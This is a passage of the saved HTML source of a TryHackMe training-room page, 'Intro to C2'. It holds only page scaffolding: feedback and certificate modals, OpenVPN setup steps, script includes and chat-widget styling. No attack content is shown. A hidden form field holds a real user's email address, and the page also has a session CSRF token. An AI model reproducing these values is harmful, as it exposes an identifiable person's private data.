<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
</form>
<p class="mt-2 mb-0" id="formMessage"></p>
</div>
</div>
</div>
<script>
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Intro to C2_files/roomFeedback.js"></script>
<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<div class="row vertical-align-custom mb-0">
<div class="col-sm-5 pr-0">
<p class="size-18 bold">Use a VPN</p>
<p>Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24">
or
</div>
<div class="col-sm-5 pl-0">
<p class="size-18 bold">Use the AttackBox</p>
<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
<h3 class="text-warning">Expiring Soon</h3>
<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
<h3 class="text-danger">Expired Machine</h3>
<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue text-center p-3">
<h4 class="mb-0 m-auto">How to access machines</h4>
<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0">
<div class="col-sm-6">
<img src="./TryHackMe _ Intro to C2_files/connect_openvpn_short.png">
<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6">
<img src="./TryHackMe _ Intro to C2_files/connect_kali_short.png">
<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title" id="roomAlertModalTitle"></h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body" id="roomAlertModalBody"></div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="resetUserProgressModal" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">Reset Your Progress</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header  modal-dark-blue">
<h5 class="modal-title">Cloud Information</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<ul class="nav nav-tabs">
<li class="nav-item pr-2">
<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/introtoc2#env-tab">Environment</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/introtoc2#creds-tab">Credentials</a>
</li>
</ul>
<div class="tab-content">
<div class="tab-pane active" id="env-tab"></div>
<div class="tab-pane" id="creds-tab"></div>
</div>
</div>
<div class="modal-footer" id="cloudEnvModalFooter">
</div>
</div>
</div>
</div>
<div class="modal fade" id="setNameModal" role="dialog">
<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title">Generating Your Certificate</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body container">
<div class="row">
<div class="col-6">
<h5 class="bold">Hey there, what's your name?</h5>
<p class="text-secondary">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group">
<label>Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
</div>
</div>
<div class="col-6">
<h5 class="bold">You're here incognito? It's ok!</h5>
<p class="text-secondary">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row">
<div class="col-6">
<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
Generate with my full name
</button>
</div>
<div class="col-6">
<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Intro to C2_files/certificateName.js"></script>
<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-links">
<div id="unstuck-video" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-play"></i></div>
<div class="unstuck-icon-text">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
<div class="unstuck-icon-text">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/6227af683ca9df0043e50e26">
<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
<div class="unstuck-icon-text">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-books"></i></div>
<div class="unstuck-icon-text">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-users"></i></div>
<div class="unstuck-icon-text">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style>

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
<div id="slideout-conn-options">
<div id="slideout-conn-header" class="text-center">
<img class="slideout-connect-img" src="./TryHackMe _ Intro to C2_files/tryhackme_connect.png">
<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
</div>
<div class="m-3 text-center">
<p>To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
<div class="col-md-12 mb-3">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/introtoc2#" onclick="showAttackBoxSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-laptop"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">AttackBox</div>
<p class="faded mb-0">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/introtoc2#" onclick="showVPNSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-key"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">OpenVPN</div>
<p class="faded mb-0">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3">
<div id="nav-openvpn">
<div class="mb-3">
<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center">
<h4>What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/introtoc2#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
</li>
<li class="nav-item m-3">
<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/introtoc2#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
</li>
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/introtoc2#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left">
<div class="tab-pane fade" id="pills-windows" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Intro to C2_files/win_ran_admin.png"></li>
<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Intro to C2_files/win_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Intro to C2_files/win_connect.png"></li>
</ol>
</div>
<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade" id="pills-macos" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Intro to C2_files/mac_installer.png"></li>
<li class="mt-2">Open and run the OpenVPN GUI application.</li>
<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Intro to C2_files/mac_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Intro to C2_files/mac_connect.png"></li>
</ol>
</div>
</div>
<section class="text-left">
<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/introtoc2#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
<h5 class="mb-0 text-openvpn">Having Problems?</h5>
</a>
<div class="collapse" id="havingProblems">
<ul class="mt-2 mb-0">
<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li>Have you restarted your VM?</li>
<li>Is your OpenVPN up-to-date?</li>
<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox">
<div class="text-center">
<h4>AttackBox</h4>
<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/introtoc2#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
</div>
</div>
</div>
</div>
<script>

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div>
<script src="./TryHackMe _ Intro to C2_files/notify.js"></script>
<script src="./TryHackMe _ Intro to C2_files/api-requests.js"></script>
<script src="./TryHackMe _ Intro to C2_files/events.js"></script>
<script src="./TryHackMe _ Intro to C2_files/underscore-min.js"></script>
<script src="./TryHackMe _ Intro to C2_files/apexcharts.min.js"></script> 
<script src="./TryHackMe _ Intro to C2_files/chart.js"></script>
<script src="./TryHackMe _ Intro to C2_files/expire.js"></script>
<script src="./TryHackMe _ Intro to C2_files/sockets.js"></script>
<script src="./TryHackMe _ Intro to C2_files/faqSearch.js"></script>
<script src="./TryHackMe _ Intro to C2_files/certificate.js"></script>
<script src="./TryHackMe _ Intro to C2_files/utils.js"></script>
<script src="./TryHackMe _ Intro to C2_files/roomSpecific.js"></script>
<script src="./TryHackMe _ Intro to C2_files/confetti.js"></script>
<script src="./TryHackMe _ Intro to C2_files/videos.js"></script>
<script src="./TryHackMe _ Intro to C2_files/intro.js"></script>
<script src="./TryHackMe _ Intro to C2_files/prism.js"></script>
<script src="./TryHackMe _ Intro to C2_files/asciinema-player.js"></script>
<script src="./TryHackMe _ Intro to C2_files/magnific-popup.min.js"></script>
<script src="./TryHackMe _ Intro to C2_files/introjsLogic.js"></script>
<script src="./TryHackMe _ Intro to C2_files/logic.js"></script>
<script src="./TryHackMe _ Intro to C2_files/tasks.js"></script>
<script src="./TryHackMe _ Intro to C2_files/connection-status.js"></script>
<script src="./TryHackMe _ Intro to C2_files/glossary.js"></script>
<script src="./TryHackMe _ Intro to C2_files/room-mymachine.js"></script>
<script src="./TryHackMe _ Intro to C2_files/heartbeat.js" defer=""></script>
<script>

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "t0vGoCRN-EM_eP27eP8-VjxlOIjr2nt8fPKw"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "introtoc2"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: true,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="1BD1A9CF-71BB-0810-928A-CD36006E9867"></div><iframe id="_hjSafeContext_13582176" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Intro to C2_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Intro to C2_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Intro to C2_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>